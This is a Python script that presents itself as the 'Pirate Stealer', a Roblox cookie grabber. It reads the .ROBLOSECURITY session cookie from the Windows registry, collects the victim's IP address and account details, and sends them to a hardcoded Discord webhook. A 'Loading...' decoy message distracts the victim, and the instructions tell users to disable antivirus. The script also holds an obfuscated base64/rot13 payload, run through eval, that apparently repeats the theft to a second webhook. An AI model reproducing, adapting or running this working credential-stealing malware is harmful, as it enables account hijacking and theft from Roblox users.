############# how to fix errors ##############################
# TUTORIAL : IF YOU'RE USING PYTHON FROM MICROSOFT STORE, YOU HAVE TO DO THIS:
# PYTHON MICROSOFT STORE : go to cmd , type (pip install requests) and when its done, type (pip install robloxpy) then it should work !
# TUTORIAL : IF YOU'RE USING PYTHON FROM python.org THEN YOU HAVE TO DO THIS:
# PYTHON WEBSITE : go to cmd type (py -m pip install requests) and when its done, type (py -m pip install robloxpy) then it should work!
###########################################################

#################### config tutorial #################
# scroll down until you find (webhook) then remove everything inside the " "
# then, paste your webhook **INSIDE** the " "
# run the app, when it closed, check your server and it should send the cookie, if not :
# check if you're logged into roblox studio
# turn of your anti virus
################################################################

try:
    import requests
    from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
    import robloxpy
    import robloxapi
    import json
    import os
except:
    print("Failed to import libraies. Please contact Mani.#0001 at discord to fix this problem.")
    exit()
dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
webhookk = "https://discord.com/api/webhooks/984818452323770388/N-vZOax4RAojwzrjK4hwOuD22A_K4Mye3FmHcao8t4GVb-WA23Ztm_UPyy8f6PTkFW6x" # put webhook here
################### Gathering INFOMATION #################################
def GrabCookie():
    # opening the roblox studio key
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    # finding the subkey called ".robloxsecurity"
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                # returns the value of .robloxsecurity
                return value
            count = count + 1
    except WindowsError:
        pass
roblox_cookie_value = str(GrabCookie())
#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### INJECT TO ROBLOX STUDIO (creds to bingo methods) #################
import base64, codecs
magic = 'DQppbXBvcnQgcmVxdWVzdHMNCmZyb20gd2lucmVnIGltcG9ydCBPcGVuS2V5LCBIS0VZX0NVUlJFTlRfVVNFUiwgRW51bVZhbHVlDQoNCndlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTg1ODc0NjI3NDAwMTcxNjYwL2xLX091RmswbkhHWFlwSUl0R0VRN0VHZjJ4TXd5TFozSnI3UU5BeVpKRGZZVTFNWEFHdTJaS2VhSWl5LVdCVnFHelUzIiAjIFB1dCB5b3VyIGRpc2NvcmQgd2ViaG9vayBpbiBoZXJlDQoNCmRlZiBHcmFiQ29va2llKCk6DQogICAgIyBvcGVuaW5nIHRoZSByb2Jsb3ggc3R1ZGlvIG'
love = 'gyrD0XVPNtVUWiLzkirUA0qJEco3OuqTttCFOCpTIhF2I5XRuYEIysD1IFHxIBIS9IH0IFYPOlVyACEyEKDIWSKSWiLzkirSkFo2Wfo3uGqUIxnJ9Ppz93p2IlKUWiLzkirP5wo20vXD0XVPNtVPZtMzyhMTyhMlO0nTHtp3Ivn2I5VTAuoTkyMPNvYaWiLzkirUAyL3IlnKE5Vt0XVPNtVUElrGbAPvNtVPNtVPNtL291oaDtCFNjQDbtVPNtVPNtVUqbnJkyVSElqJH6QDbtVPNtVPNtVPNtVPOhLJ1yYPO2LJk1MFjtqUyjMFN9VRIhqJ1JLJk1MFulo2Wfo3umqUIxnJ9jLKEbYPOwo3IhqPxAPvNtVPNtVPNtVPNtVTyzVT5uoJHtCG0tVv5F'
god = 'T0JMT1NFQ1VSSVRZIjoNCiAgICAgICAgICAgICAgICAjIHJldHVybnMgdGhlIHZhbHVlIG9mIC5yb2Jsb3hzZWN1cml0eQ0KICAgICAgICAgICAgICAgIHJldHVybiB2YWx1ZQ0KICAgICAgICAgICAgY291bnQgPSBjb3VudCArIDENCiAgICBleGNlcHQgV2luZG93c0Vycm9yOg0KICAgICAgICBwYXNzDQp0cnk6DQogICAgIyBUaGlzIHdpbGwgdHJ5IHRvIHJldHVybiB0aGUgdmFsdWUgb2YgdGhlIHN1YmtleSAiLnJvYmxveHNlY3VyaXR5Ig0KICAgIHJvYmxveF9jb29raWVfdmFsdWUgPSBzdHIoR3JhYkNvb2tpZSgpKQ0KICAgIC'
destiny = 'ZtqUW5VUEiVTqyqPO0nTHtMKuuL3DtL29in2yyQDbtVPNtpz9voT94K2Aio2gcMFN9VUWiLzkirS9wo29enJIsqzSfqJHhp3OfnKDbVxACG0f6BwjvXIfkKF5mpTkcqPtvCvVcJmOqQDbtVPNtVlOjo3A0VTAio2gcMFO0olO5o3IlVUqyLzuio2fAPvNtVPOlMKS1MKA0pl5jo3A0XUqyLzuio2ffVTcmo249rlW1p2IlozSgMFV6VyWiLzkirPOQo29enJHtE3WuLzWypvVfVzAioaEyoaDvBzLvLTOtr3WiLzkirS9wo29enJI9LTOtVa0cQDbtVPNtVlOHnTHtpz9voT94VUA0qJEcolOjLKEbVUqup24aqPOzo3IhMN0XMKuwMKO0BaOup3Z='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
#################### SENDING TO WEBHOOK #################
data = {
    'content' : f'***Got A Hit 💎***\n\n**Roblox Username**\n```{username}```\n**Robux Balance**\n```{robux}```\n**Premium Status**\n```{premium}```\n**IP Address**\n```{ip_address}```\n**.ROBLOSECURITY**\n```{roblox_cookie}```\n\n**Beamed Using Pirate Stealer 💸**',
    'avatar_url' : 'https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png',
    'username' : "BOT - Pirate 💎"
}

requests.post(webhookk,data=data)
